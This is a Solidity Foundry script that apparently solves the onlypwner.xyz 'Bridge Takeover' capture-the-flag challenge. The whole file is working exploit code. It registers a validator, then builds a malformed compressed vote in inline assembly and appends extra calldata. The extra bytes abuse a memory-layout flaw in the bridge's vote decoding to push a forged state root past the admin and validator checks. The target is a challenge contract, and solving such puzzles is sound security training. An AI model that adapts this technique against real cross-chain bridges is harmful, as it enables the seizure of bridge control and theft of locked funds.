pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";

interface IBridge {
    struct ValidatorInfo {
        uint256 deposit;
        address referrer;
        bytes32 tag;
    }

    function voteForNewRoot(bytes calldata vote) external;

    function registerValidator(address referrer, bytes32 tag) external payable;

    function addAdmin(address admin) external;

    function owner() external view returns (address);

    function admins(uint256) external view returns (address);

    function validators(address) external view returns (ValidatorInfo memory);

    function votedOn(bytes32, address) external view returns (bool);

    function votesFor(bytes32) external view returns (uint256);

    function stateRoot() external view returns (bytes32);

    event ValidatorRegistered(address indexed validator, bytes32 tag);
    event ValidatorUnregistered(address indexed validator);
    event ValidatorActivated(address indexed validator);
    event ValidatorDisabled(address indexed validator);

    event NewStateRoot(bytes32 indexed stateRoot, bytes32 indexed validatorTag);
}

// https://onlypwner.xyz/challenges/3
contract SolveBridgeTakeover is Script {
    IBridge constant BRIDGE = IBridge(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);
    address constant USER = 0x34788137367a14f2C4D253F9a6653A93adf2D234;

    function run() external {
        vm.startBroadcast();

        if (BRIDGE.validators(USER).deposit == 0) {
            BRIDGE.registerValidator{value: 1 ether}(address(0), bytes32("pwn"));
        }

        bytes memory vote = new bytes(0x6c);
        assembly {
            // decodeCompressedVote() reads from memory 0x00, 0x20, 0x22.
            mstore(add(vote, 0x20), 0xdeadbeef) // newRoot = bytes32(uint256(0xdeadbeef))
            mstore(add(vote, 0x40), USER) // isFor = true, and pointer-0 fallback admin[0]
            // pointer-0x60 path: make mload(0x60) non-zero (length > 0).
            // Only the first 12 bytes of this word are inside vote data,
            // so put non-zero at the first byte.
            mstore(add(vote, 0x80), shl(248, 1))
        }

        // Extra 32 bytes become memory at 0x80 after calldatacopy,
        // used as currentAdmins[0] when empty-array pointer is 0x60.
        bytes memory payload =
            bytes.concat(abi.encodeWithSelector(IBridge.voteForNewRoot.selector, vote), bytes32(uint256(uint160(USER))));

        (bool ok,) = address(BRIDGE).call(payload);
        require(ok, "vote call failed");
        vm.stopBroadcast();
    }
}
